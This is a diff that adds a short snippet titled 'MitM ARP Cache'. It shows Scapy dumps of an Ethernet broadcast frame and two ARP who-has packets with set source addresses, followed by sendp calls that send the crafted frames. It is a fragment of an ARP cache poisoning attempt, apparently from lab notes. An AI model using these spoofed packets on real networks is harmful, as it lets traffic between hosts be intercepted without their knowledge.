@@ -1,2 +1,42 @@
+MitM ARP Cache
+###[ Ethernet ]### 
+  dst       = ff:ff:ff:ff:ff:ff
+  src       = fa:16:3e:a2:90:c8
+  type      = ARP
+>>> b.show()
+###[ ARP ]### 
+  hwtype    = 0x1
+  ptype     = IPv4
+  hwlen     = None
+  plen      = None
+  op        = who-has
+  hwsrc     = fa:16:3e:a2:90:c8
+  psrc      = 172.16.82.106
+  hwdst     = 00:00:00:00:00:00
+  pdst      = 0.0.0.0
+###[ ARP ]### 
+  hwtype    = 0x1
+  ptype     = IPv4
+  hwlen     = None
+  plen      = None
+  op        = who-has
+  hwsrc     = fa:16:3e:a2:90:c8
+  psrc      = 172.16.82.115
+  hwdst     = 00:00:00:00:00:00
+  pdst      = 172.16.82.126
+sendp(z/a)
+sendp(z/b)
+
+
+
+
+
+
+
+
+
+
+
+
 
 
